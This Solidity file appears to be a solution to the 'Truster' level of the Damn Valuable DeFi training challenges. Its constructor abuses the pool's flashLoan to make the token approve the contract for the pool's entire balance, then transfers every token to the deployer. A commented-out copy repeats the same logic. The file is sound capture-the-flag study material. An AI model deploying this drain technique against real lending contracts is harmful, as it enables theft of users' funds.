// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract FaultyContract {
    constructor(TrusterLenderPool _pool) {
        address target = address(_pool.token());
        address spender = address(this);
        uint256 amount = DamnValuableToken(_pool.token()).balanceOf(address(_pool));
        // 0x095ea7b30000000000000000000000008464135c8f25da09e49bc8782676a84730c318bc00000000
        // 000000000000000000000000000000000000d3c21bcecceda1000000
        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", spender, amount);
        (bool success) = _pool.flashLoan(0, address(this), target, callData);
        if (success) {
            DamnValuableToken(_pool.token()).transferFrom(address(_pool), msg.sender, amount);
        }
    }

    /**
     * @dev "naive_reciever : learnt to do it in one transaction i.e -> on Deployment as above"
     */
    // function firstTimer(TrusterLenderPool _pool) external {
    //     address target = address(_pool.token());
    //     address spender = address(this);
    //     uint256 amount = DamnValuableToken(_pool.token()).balanceOf(address(_pool));
    //     // 0x095ea7b30000000000000000000000008464135c8f25da09e49bc8782676a84730c318bc00000000
    //     // 000000000000000000000000000000000000d3c21bcecceda1000000
    //     bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", spender, amount);
    //     (bool success) = _pool.flashLoan(0, address(this), target, callData);
    //     if (success) {
    //         DamnValuableToken(_pool.token()).transferFrom(address(_pool), msg.sender, amount);
    //     }
    // }
}
